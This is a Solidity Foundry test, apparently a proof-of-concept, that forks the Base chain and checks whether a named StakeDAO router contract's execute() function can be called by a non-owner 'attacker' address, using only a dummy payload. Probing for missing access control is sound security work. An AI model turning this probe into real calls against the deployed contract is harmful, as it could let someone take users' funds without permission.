// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IRouter {
    function execute(bytes[] calldata calls) external payable returns (bytes[] memory);
    function owner() external view returns (address);
}

contract StakeDAOPoC is Test {
    IRouter constant router = IRouter(0xfd1A2A8127A929a7B490ff6b50f70d73946f4a1F);

    function setUp() public {
        vm.createSelectFork(vm.envString("BASE_FORK_URL"));
    }

    function testPermissionlessExecute() public {
        address attacker = address(0xBAD);
        address owner = router.owner();
        
        console.log("Router Owner:", owner);
        console.log("Attacker:", attacker);
        
        // Ensure the attacker is not the owner
        require(attacker != owner, "Attacker is owner");

        // Craft a dummy payload. The first byte is the Module ID.
        // We use 0x01 as a placeholder; the test only cares about the access control on execute itself.
        bytes memory dummyCall = abi.encodePacked(
            bytes1(uint8(1)), 
            abi.encodeWithSignature("someFunction()")
        );
        
        bytes[] memory calls = new bytes[](1);
        calls[0] = dummyCall;

        vm.prank(attacker);
        
        try router.execute(calls) {
            console.log("SUCCESS: execute() is PERMISSIONLESS. Access control is missing.");
        } catch Error(string memory reason) {
            console.log("Reverted with reason:", reason);
            if (keccak256(bytes(reason)) == keccak256(bytes("OwnableUnauthorizedAccount"))) {
                console.log("SAFE: Access control is present.");
            } else {
                console.log("VULNERABLE: Reverted, but NOT due to an ownership check.");
            }
        } catch (bytes memory) {
            console.log("Reverted with a custom error/silent revert.");
            console.log("If this is not an ownership check, the execute function is exposed.");
        }
    }
}
